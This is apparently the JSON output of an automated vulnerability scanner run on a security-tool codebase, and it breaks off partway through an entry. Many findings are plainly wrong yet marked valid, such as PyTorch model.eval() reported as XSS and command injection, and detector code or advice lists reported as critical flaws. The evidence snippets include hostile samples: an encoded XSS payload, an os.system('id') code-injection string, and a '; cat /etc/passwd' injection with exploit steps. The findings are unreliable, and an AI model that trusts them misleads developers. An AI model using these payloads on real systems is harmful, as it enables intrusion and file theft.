{
  "metadata": {
    "project_name": "PDF Test",
    "project_version": "1.0.0",
    "report_date": "2025-10-07",
    "total_findings": 89
  },
  "findings": [
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in train_multitask_vulnhunter.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "train_multitask_vulnhunter.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "    checkpoint = torch.load(output_dir / 'best_multitask_model.pth')\n    model.load_state_dict(checkpoint['model_state_dict'])\n    model.eval()\n    model.to(device)\n",
          "line_numbers": [
            356
          ],
          "file_path": "train_multitask_vulnhunter.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u2713 User input flows to output",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in train_multitask_vulnhunter.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "train_multitask_vulnhunter.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "    checkpoint = torch.load(output_dir / 'best_multitask_model.pth')\n    model.load_state_dict(checkpoint['model_state_dict'])\n    model.eval()\n    model.to(device)\n",
          "line_numbers": [
            356
          ],
          "file_path": "train_multitask_vulnhunter.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "SQLi-001",
        "title": "SQL Injection in vulnerability_predictor.py",
        "type": "SQL Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-89",
        "description": "SQL injection vulnerability detected due to sql query with string concatenation",
        "impact": "Attacker can execute arbitrary SQL queries, leading to data breach, data manipulation, or complete database compromise.",
        "affected_component": "vulnerability_predictor.py",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', [user_id])",
        "references": [
          "https://owasp.org/www-community/attacks/SQL_Injection",
          "https://cwe.mitre.org/data/definitions/89.html"
        ],
        "evidence": {
          "code_snippet": "        {\n            'name': 'SQL Injection',\n            'code': 'query = \"SELECT * FROM users WHERE id = \" + user_id',\n            'file_path': 'app/database.py',\n            'context': 'cursor.execute(query)',",
          "line_numbers": [
            173
          ],
          "file_path": "vulnerability_predictor.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Automated + Pattern Analysis",
        "steps_completed": [
          "\u2713 Checked for parameterized queries - NOT FOUND",
          "\u2713 Detected string concatenation in SQL query",
          "\u2713 User input flows into SQL query",
          "\u2713 Generated proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in vulnerability_predictor.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: exec() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "vulnerability_predictor.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        {\n            'name': 'Command Injection',\n            'code': 'exec(user_input)',\n            'file_path': 'lib/processor.js',\n            'context': 'const result = exec(user_input);',",
          "line_numbers": [
            180
          ],
          "file_path": "vulnerability_predictor.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-002",
        "title": "Command Injection in vulnerability_predictor.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: exec() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "vulnerability_predictor.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            'code': 'exec(user_input)',\n            'file_path': 'lib/processor.js',\n            'context': 'const result = exec(user_input);',\n            'language': 'JavaScript'\n        },",
          "line_numbers": [
            182
          ],
          "file_path": "vulnerability_predictor.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in demo_hackerone_fp_system.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: innerHTML assignment without sanitization",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "demo_hackerone_fp_system.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "            'code': '''\nfunction displayComment(text) {\n    document.getElementById('comment').innerHTML = text;\n}\n            ''',",
          "line_numbers": [
            162
          ],
          "file_path": "demo_hackerone_fp_system.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in train_hackerone_fp_model.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "train_hackerone_fp_model.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "    def validate(self, dataloader):\n        \"\"\"Validate model\"\"\"\n        self.model.eval()\n        total_loss = 0\n        predictions = []",
          "line_numbers": [
            157
          ],
          "file_path": "train_hackerone_fp_model.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-002",
        "title": "Cross-Site Scripting in train_hackerone_fp_model.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "train_hackerone_fp_model.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "    logger.info(\"\\nEvaluating on test set...\")\n\n    model.eval()\n    predictions = []\n    labels = []",
          "line_numbers": [
            300
          ],
          "file_path": "train_hackerone_fp_model.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in train_hackerone_fp_model.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "train_hackerone_fp_model.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "    def validate(self, dataloader):\n        \"\"\"Validate model\"\"\"\n        self.model.eval()\n        total_loss = 0\n        predictions = []",
          "line_numbers": [
            157
          ],
          "file_path": "train_hackerone_fp_model.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-002",
        "title": "Command Injection in train_hackerone_fp_model.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "train_hackerone_fp_model.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "    logger.info(\"\\nEvaluating on test set...\")\n\n    model.eval()\n    predictions = []\n    labels = []",
          "line_numbers": [
            300
          ],
          "file_path": "train_hackerone_fp_model.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in gpu_optimization_utils.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/gpu_optimization_utils.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "        device = torch.device('cuda')\n        model = model.to(device)\n        model.eval()\n\n        batch_size = initial_batch_size",
          "line_numbers": [
            86
          ],
          "file_path": "core/gpu_optimization_utils.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in gpu_optimization_utils.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/gpu_optimization_utils.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        device = torch.device('cuda')\n        model = model.to(device)\n        model.eval()\n\n        batch_size = initial_batch_size",
          "line_numbers": [
            86
          ],
          "file_path": "core/gpu_optimization_utils.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "SQLi-001",
        "title": "SQL Injection in false_positive_reduction.py",
        "type": "SQL Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-89",
        "description": "SQL injection vulnerability detected due to sql query with string concatenation",
        "impact": "Attacker can execute arbitrary SQL queries, leading to data breach, data manipulation, or complete database compromise.",
        "affected_component": "core/false_positive_reduction.py",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', [user_id])",
        "references": [
          "https://owasp.org/www-community/attacks/SQL_Injection",
          "https://cwe.mitre.org/data/definitions/89.html"
        ],
        "evidence": {
          "code_snippet": "    code2 = \"\"\"\n    def get_user(username):\n        query = \"SELECT * FROM users WHERE username = '\" + username + \"'\"\n        cursor.execute(query)\n        return cursor.fetchone()",
          "line_numbers": [
            570
          ],
          "file_path": "core/false_positive_reduction.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Automated + Pattern Analysis",
        "steps_completed": [
          "\u2713 Checked for parameterized queries - NOT FOUND",
          "\u2713 Detected string concatenation in SQL query",
          "\u2713 User input flows into SQL query",
          "\u2713 Generated proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "SQLi-001",
        "title": "SQL Injection in zero_false_positive_engine.py",
        "type": "SQL Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-89",
        "description": "SQL injection vulnerability detected due to sql query with string concatenation",
        "impact": "Attacker can execute arbitrary SQL queries, leading to data breach, data manipulation, or complete database compromise.",
        "affected_component": "core/zero_false_positive_engine.py",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', [user_id])",
        "references": [
          "https://owasp.org/www-community/attacks/SQL_Injection",
          "https://cwe.mitre.org/data/definitions/89.html"
        ],
        "evidence": {
          "code_snippet": "        code=\"\"\"\ndef get_user(username):\n    query = \"SELECT * FROM users WHERE username = '\" + username + \"'\"\n    cursor.execute(query)\n    return cursor.fetchone()",
          "line_numbers": [
            747
          ],
          "file_path": "core/zero_false_positive_engine.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Automated + Pattern Analysis",
        "steps_completed": [
          "\u2713 Checked for parameterized queries - NOT FOUND",
          "\u2713 Detected string concatenation in SQL query",
          "\u2713 User input flows into SQL query",
          "\u2713 Generated proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in zero_false_positive_engine.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/zero_false_positive_engine.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "        score = 0.0\n\n        # Check for shell=True or system() calls\n        if re.search(r'(shell\\s*=\\s*True|os\\.system|subprocess\\.call)', detection.code):\n            evidence.append(\"Shell execution detected\")",
          "line_numbers": [
            450
          ],
          "file_path": "core/zero_false_positive_engine.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in enhanced_beast_http_analyzer.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: eval() with potentially user-controlled data",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/enhanced_beast_http_analyzer.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "            {\n                'type': 'Filter Bypass XSS',\n                'payload': \"<img src=x onerror=eval(atob('YWxlcnQoMSk='))>\",\n                'impact': 'Bypass of XSS protection mechanisms',\n                'severity': 'High'",
          "line_numbers": [
            225
          ],
          "file_path": "core/enhanced_beast_http_analyzer.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in enhanced_beast_http_analyzer.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: eval() with user input",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/enhanced_beast_http_analyzer.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            {\n                'type': 'Filter Bypass XSS',\n                'payload': \"<img src=x onerror=eval(atob('YWxlcnQoMSk='))>\",\n                'impact': 'Bypass of XSS protection mechanisms',\n                'severity': 'High'",
          "line_numbers": [
            225
          ],
          "file_path": "core/enhanced_beast_http_analyzer.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-002",
        "title": "Command Injection in enhanced_beast_http_analyzer.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/enhanced_beast_http_analyzer.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            {\n                'type': 'Code Injection',\n                'payload': \"__import__('os').system('id')\",\n                'impact': 'Arbitrary code execution',\n                'severity': 'Critical'",
          "line_numbers": [
            265
          ],
          "file_path": "core/enhanced_beast_http_analyzer.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.9,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u26a0 Could not confirm user input",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-003",
        "title": "Command Injection in enhanced_beast_http_analyzer.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/enhanced_beast_http_analyzer.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                \"Avoid dynamic code execution\",\n                \"Implement strict input validation\",\n                \"Use safe APIs and avoid system() calls\",\n                \"Apply sandboxing and containerization\",\n                \"Implement proper access controls\"",
          "line_numbers": [
            388
          ],
          "file_path": "core/enhanced_beast_http_analyzer.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-001",
        "title": "Command Injection in professional_bounty_reporter.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/professional_bounty_reporter.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "            'exploit_payload': '127.0.0.1; cat /etc/passwd',\n            'exploit_steps': [\n                '1. Identify user input parameter that flows to system() call',\n                '2. Inject command separator (;) followed by malicious command',\n                '3. Execute payload to read /etc/passwd or other sensitive files',",
          "line_numbers": [
            133
          ],
          "file_path": "core/professional_bounty_reporter.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2717 No dangerous function found",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "CMDi-003",
        "title": "Command Injection in professional_bounty_reporter.py",
        "type": "Command Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-78",
        "description": "Command injection vulnerability: C system() call",
        "impact": "Attacker can execute arbitrary system commands, potentially leading to full system compromise, data exfiltration, or denial of service.",
        "affected_component": "core/professional_bounty_reporter.py",
        "remediation": "Use subprocess with shell=False and pass arguments as a list. Avoid os.system() entirely. Validate and sanitize all user input.",
        "references": [
          "https://owasp.org/www-community/attacks/Command_Injection",
          "https://cwe.mitre.org/data/definitions/78.html"
        ],
        "evidence": {
          "code_snippet": "                \"```python\",\n                \"# Vulnerable\",\n                \"os.system(f'ping {user_input}')\",\n                \"\",\n                \"# Secure\",",
          "line_numbers": [
            447
          ],
          "file_path": "core/professional_bounty_reporter.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 1.0,
        "validation_method": "Static Analysis + Function Detection",
        "steps_completed": [
          "\u2713 No shell=False protection",
          "\u2713 Dangerous function detected",
          "\u2713 No input validation",
          "\u2713 User input flows to command",
          "\u2713 Generated command injection PoC"
        ]
      }
    },
    {
      "finding": {
        "id": "XSS-001",
        "title": "Cross-Site Scripting in vulnerability_validator.py",
        "type": "Cross-Site Scripting (XSS)",
        "severity": "High",
        "cvss_score": 7.1,
        "cwe_id": "CWE-79",
        "description": "XSS vulnerability detected: React dangerouslySetInnerHTML",
        "impact": "Attacker can execute arbitrary JavaScript in victim's browser, steal cookies, session tokens, or perform actions on behalf of the user.",
        "affected_component": "core/vulnerability_validator.py",
        "remediation": "Sanitize user input before rendering. Use textContent instead of innerHTML, or use a sanitization library like DOMPurify.",
        "references": [
          "https://owasp.org/www-community/attacks/xss/",
          "https://cwe.mitre.org/data/definitions/79.html"
        ],
        "evidence": {
          "code_snippet": "\n        # Step 2: Check for dangerous sinks\n        dangerous_sinks = ['innerHTML', 'document.write', 'eval', 'v-html', 'dangerouslySetInnerHTML']\n        has_dangerous_sink = any(sink in code for sink in dangerous_sinks)\n",
          "line_numbers": [
            182
          ],
          "file_path": "core/vulnerability_validator.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.7,
        "validation_method": "Static Analysis + Pattern Matching",
        "steps_completed": [
          "\u2713 No sanitization detected",
          "\u2713 Dangerous sink detected (innerHTML/document.write/etc)",
          "\u26a0 Could not confirm user input flow",
          "\u26a0 CSP check requires runtime analysis",
          "\u2713 Generated XSS proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "SQLi-001",
        "title": "SQL Injection in ast_feature_extractor.py",
        "type": "SQL Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-89",
        "description": "SQL injection vulnerability detected due to sql query with string concatenation",
        "impact": "Attacker can execute arbitrary SQL queries, leading to data breach, data manipulation, or complete database compromise.",
        "affected_component": "core/ast_feature_extractor.py",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', [user_id])",
        "references": [
          "https://owasp.org/www-community/attacks/SQL_Injection",
          "https://cwe.mitre.org/data/definitions/89.html"
        ],
        "evidence": {
          "code_snippet": "    test_code = \"\"\"\ndef vulnerable_login(username, password):\n    query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n    cursor.execute(query)\n    return cursor.fetchone()",
          "line_numbers": [
            502
          ],
          "file_path": "core/ast_feature_extractor.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Automated + Pattern Analysis",
        "steps_completed": [
          "\u2713 Checked for parameterized queries - NOT FOUND",
          "\u2713 Detected string concatenation in SQL query",
          "\u2713 User input flows into SQL query",
          "\u2713 Generated proof of concept"
        ]
      }
    },
    {
      "finding": {
        "id": "SQLi-001",
        "title": "SQL Injection in z3_verification_module.py",
        "type": "SQL Injection",
        "severity": "Critical",
        "cvss_score": 9.8,
        "cwe_id": "CWE-89",
        "description": "SQL injection vulnerability detected due to sql query with string concatenation",
        "impact": "Attacker can execute arbitrary SQL queries, leading to data breach, data manipulation, or complete database compromise.",
        "affected_component": "core/z3_verification_module.py",
        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', [user_id])",
        "references": [
          "https://owasp.org/www-community/attacks/SQL_Injection",
          "https://cwe.mitre.org/data/definitions/89.html"
        ],
        "evidence": {
          "code_snippet": "        sql_code = \"\"\"\n        def get_user(username):\n            query = \"SELECT * FROM users WHERE name = '\" + username + \"'\"\n            return execute_query(query)\n        \"\"\"",
          "line_numbers": [
            521
          ],
          "file_path": "core/z3_verification_module.py"
        }
      },
      "validation": {
        "is_valid": true,
        "confidence": 0.8,
        "validation_method": "Automated + Pattern Analysis",
        "steps_completed": [
          "\u2713 Checked for parameterized queries - NOT FOUND",
          "\u2713 Detected string concatenation in SQL query",
          "\u2713 User input flows into SQL query",
